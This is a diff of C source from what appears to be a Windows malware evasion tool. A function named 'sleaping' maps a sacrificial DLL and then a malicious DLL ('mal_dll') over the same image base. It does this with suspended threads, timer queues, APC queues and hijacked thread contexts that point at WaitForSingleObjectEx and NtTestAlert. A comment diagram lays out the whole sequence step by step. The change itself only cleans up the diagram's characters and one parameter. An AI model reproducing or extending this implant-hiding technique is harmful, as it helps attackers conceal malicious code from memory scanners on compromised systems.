@@ -9,42 +9,40 @@ VOID CALLBACK ResumeThreadCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired)
 }
 
 /*
-
 Main thread
-    ©¦
-    ©À©¤ Initialization phase (0-several ms)
-    ©¦   ©À©¤ Create event object
-    ©¦   ©À©¤ Allocate CONTEXT memory
-    ©¦   ©¸©¤ Create thread 2 (suspended state)
-    ©¦
-    ©À©¤ Configure thread 2
-    ©¦   ©À©¤ Get thread context
-    ©¦   ©À©¤ Modify to WaitForSingleObjectEx(NtTestAlert returns)
-    ©¦   ©¸©¤ Resume thread 2 execution
-    ©¦
-    ©À©¤ Create other threads
-    ©¦   ©À©¤ CreateThread0 (suspended): UnmapViewOfFile
-    ©¦   ©À©¤ CreateThread1 (suspended): MapViewOfFileEx(sac_dll)
-    ©¦   ©¸©¤ CreateThread3 (suspended): MapViewOfFileEx(mal_dll)
-    ©¦
-    ©À©¤ Configure thread context
-    ©¦   ©À©¤ Thread 0: UnmapViewOfFile(image_base)
-    ©¦   ©À©¤ Thread 1: MapViewOfFileEx(sac_dll¡úimage_base)
-    ©¦   ©¸©¤ Thread 3: MapViewOfFileEx(mal_dll¡úimage_base)
-    ©¦
-    ©À©¤ Create timer queue
-    ©¦
-    ©À©¤ Set APC queue (thread 2)
-    ©¦   ©À©¤ APC1: UnmapViewOfFile(image_base)
-    ©¦   ©À©¤ APC2: ResumeThread (Thread 3)
-    ©¦   ©¸©¤ APC3: ExitThread (thread 2 itself)
-    ©¦
-    ©À©¤ Set timer
-    ©¦   ©À©¤ Timer 1 (200ms): ResumeThread (Thread 0)
-    ©¦   ©¸©¤ Timer 2 (300ms): ResumeThread (Thread 1)
-    ©¦
-    ©¸©¤ Wait for all threads to complete
-
+    |
+    +-- Initialization phase (0-several ms)
+    |    +-- Create event object
+    |    +-- Allocate CONTEXT memory
+    |    +-- Create thread 2 (suspended state)
+    |
+    +-- Configure thread 2
+    |    +-- Get thread context
+    |    +-- Modify to WaitForSingleObjectEx(NtTestAlert returns)
+    |    +-- Resume thread 2 execution
+    |
+    +-- Create other threads
+    |    +-- CreateThread0 (suspended): UnmapViewOfFile
+    |    +-- CreateThread1 (suspended): MapViewOfFileEx(sac_dll)
+    |    +-- CreateThread3 (suspended): MapViewOfFileEx(mal_dll)
+    |
+    +-- Configure thread context
+    |    +-- Thread 0: UnmapViewOfFile(image_base)
+    |    +-- Thread 1: MapViewOfFileEx(sac_dll->image_base)
+    |    +-- Thread 3: MapViewOfFileEx(mal_dll->image_base)
+    |
+    +-- Create timer queue
+    |
+    +-- Set APC queue (thread 2)
+    |    +-- APC1: UnmapViewOfFile(image_base)
+    |    +-- APC2: ResumeThread (Thread 3)
+    |    +-- APC3: ExitThread (thread 2 itself)
+    |
+    +-- Set timer
+    |    +-- Timer 1 (200ms): ResumeThread (Thread 0)
+    |    +-- Timer 2 (300ms): ResumeThread (Thread 1)
+    |
+    +-- Wait for all threads to complete
 */
 
 int sleaping(
@@ -52,8 +50,7 @@ int sleaping(
     HANDLE sac_dll_handle,
     HANDLE mal_dll_handle,
     SIZE_T view_size,
-    PNT_FUNCTIONS nt_func_s,
-    PVOID NtTestAlert_addr
+    PNT_FUNCTIONS nt_func_s
 )
 {
 
@@ -111,7 +108,7 @@ int sleaping(
     }
 
     // Set up thread context to call WaitForSingleObjectEx with NtTestAlert on stack
-    *(ULONG_PTR*)((*context_2).Rsp) = (DWORD64)NtTestAlert_addr;
+    *(ULONG_PTR*)((*context_2).Rsp) = (DWORD64)nt_func_s->NtTestAlert;
     (*context_2).Rip = (DWORD64)WaitForSingleObjectEx;
     (*context_2).Rcx = (DWORD64)(dummy_event);
     (*context_2).Rdx = (DWORD64)21000;         // 21 second timeout
